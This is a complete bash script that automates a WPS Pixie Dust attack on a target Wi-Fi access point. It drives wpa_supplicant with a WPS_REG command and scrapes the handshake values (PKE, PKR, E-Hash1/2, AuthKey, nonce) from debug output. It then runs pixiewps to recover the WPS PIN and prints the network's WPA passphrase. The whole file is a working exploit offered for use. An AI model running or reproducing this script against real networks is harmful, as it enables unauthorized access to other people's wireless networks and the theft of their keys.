#!/bin/bash

#Declare variables
TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
FIFO=$(mktemp -u --suffix=.pipe)
mkfifo $FIFO

#Help function
function usage()
{
	echo "Usage: $(basename $0) [options]"
	echo -e "-i <interface> \tInterface name"
	echo -e "-b <bssid>     \tTarget BSSID"
	echo -e "-p <pin>       \tWPS pin to use (optional)"
	echo -e "-h             \tShow this help"
	exit
}

#Clear and exit
function quit() 
{
	rm -rf $TEMPDIR $TEMPFILE $FIFO
	exit
}

#Run pixiewps
function pixie()
{
	printI "Launching PixieWPS..."
	TEMPOUT=$(mktemp)
	pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force | tee $TEMPOUT
	if [ "$?" -eq 0 ]
	then
		PIN=$(cat $TEMPOUT | grep 'WPS pin' | awk '{print $4}')
		PIXIE_STATUS=SUCCESS
	else
		PIXIE_STATUS=FAIL
	fi
	rm -rf $TEMPOUT
}

#Main function
function attack()
{
	#Kill all other wpa_supplicant instances if any
	killall -9 wpa_supplicant &> /dev/null

	#Launch wpa_supplicant
	printI "Launching wpa_supplicant"
	wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &

	#Send WPS_REG command to wpa_supplicant socket
	sleep 5 && sendCMD &
	BREAK=0

	#Parse wpa_supplicant output
	while IFS= read -r LINE
	do
		#WPS messages
		parseWPS

		#Status messages
		parseStatus

		if [ "$BREAK" -eq 1 ]
		then
			break
		fi

	done < $FIFO
}

#Write wpa_supplicant config
function writeConf()
{
	printI "Writing wpa_supplicant config"
	echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE
}

#Send command to wpa_supplicant socket
function sendCMD()
{
	printI "Trying pin: $PIN"
	echo -n "WPS_REG $BSSID $PIN" | nc -u -U "$TEMPDIR/$IFACE" || quit 
}

#Get hex value
function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}

#Parse WPS messages
function parseWPS()
{
	#WPS messages
	if [[ $LINE =~ "WPS:" ]]
	then
		if [[ $LINE =~ "Building Message M" ]]
		then
			printI "Sending WPS Message $(echo "$LINE" | awk '{print $4}')"
		elif [[ $LINE =~ "Received M" ]]
		then
			printI "Received WPS Message $(echo "$LINE" | awk '{print $3}')"
		elif [[ $LINE =~ "Enrollee Nonce" ]]\
		  && [[ $LINE =~ "hexdump" ]]
		then
			ENONCE=$(gethex "$LINE")
			printG "E-Nonce: $ENONCE"
		elif [[ $LINE =~ "DH own Public Key" ]] 
		then
			PKR=$(gethex "$LINE")
			printG "PKR: $PKR"
		elif [[ $LINE =~ "DH peer Public Key" ]]\
		  && [[ $LINE =~ "hexdump" ]]
		then
			PKE=$(gethex "$LINE")
			printG "PKE: $PKE"
		elif [[ $LINE =~ "AuthKey" ]]
		then
			AUTHKEY=$(gethex "$LINE")
			printG "AuthKey: $AUTHKEY"
		elif [[ $LINE =~ "E-Hash1" ]]
		then
			EHASH1=$(gethex "$LINE")
			printG "E-Hash1: $EHASH1"
		elif [[ $LINE =~ "E-Hash2" ]]
		then
			EHASH2=$(gethex "$LINE")
			printG "E-Hash2: $EHASH2"
		elif [[ $LINE =~ "Network Key" ]]\
		  && [[ $LINE =~ "hexdump" ]]
		then
			WPA_KEY=$(gethex "$LINE" | xxd -r -p)
			printG "WPA pass: $WPA_KEY"
			quit
		elif [[ $LINE =~ "Received WSC_NACK" ]]
		then
			printI 'Received WSC NACK'
			printE 'Error: wrong PIN code'
			BREAK=1
		fi
	fi
}

function parseStatus()
{
	if [[ $LINE =~ "State:" ]]
	then
		if [[ $LINE =~ "-> SCANNING" ]]
		then
			printI "Scanning…"
		fi
		
	elif [[ $LINE =~ "WPS-FAIL" ]]
	then
		printE "wpa_supplicant returned WPS-FAIL"
		BREAK=1
	elif [[ $LINE =~ "Trying\ to\ authenticate\ with" ]]
	then
		printI "Authenticating..."
	elif [[ $LINE =~ "Authentication response" ]]
	then
		printG "Authenticated"
	elif [[ $LINE =~ "Trying to associate with" ]]
	then
		printI "Associating with AP..."
	elif [[ $LINE =~ "Associated with" ]] &&\
	     [ "$(echo "$LINE" | grep $IFACE)" ]
	then
		printG "Associated with $BSSID"
	elif [[ $LINE =~ "EAPOL: txStart" ]]
	then
		printI "Sending EAPOL Start..."
	elif [[ $LINE =~ "EAP entering state IDENTITY" ]]
	then
		printI "Received Identity Requset"
	elif [[ $LINE =~ "using real identity" ]]
	then
		printI "Sending Identity Response..."
	fi
}

#Output formatting
DEFAULT="\e[0m"
BLUE="\e[34m"
GREEN="\e[32m"
RED="\e[31m"

function printI() { echo -e "$BLUE[*]$DEFAULT $@"; }
function printE() { echo -e "$RED[-]$DEFAULT $@"; }
function printG() { echo -e "$GREEN[+]$DEFAULT $@"; }

#Parse arguments
while getopts "i:b:p:h" opt
do
        case $opt in
                i)
                        IFACE=${OPTARG};;
                b)
                        BSSID=${OPTARG};;
                p)
                        PIN=${OPTARG};;
                h)
                        usage;;
                *)
                        usage;;
        esac
done

#Start here
#Check if BSSID and Interface provided
if [ ! "$BSSID" ]\
|| [ ! "$IFACE" ]
then
	usage
fi

#Check if pin provided
if [ ! "$PIN" ]
then
	PIN=12345670
fi

writeConf
attack

#Run pixiewps if all required data is collected
if [ "$PKE" ]\
&& [ "$PKR" ]\
&& [ "$EHASH1" ]\
&& [ "$EHASH2" ]\
&& [ "$ENONCE" ]
then
	pixie
	if [ "$PIXIE_STATUS" = "SUCCESS" ]
	then
		printG "WPS pin: $(echo $PIN)"
		attack
	fi
else
	printE "Not enough data to run PixieDust"
fi

#Remove temp files and exit
quit
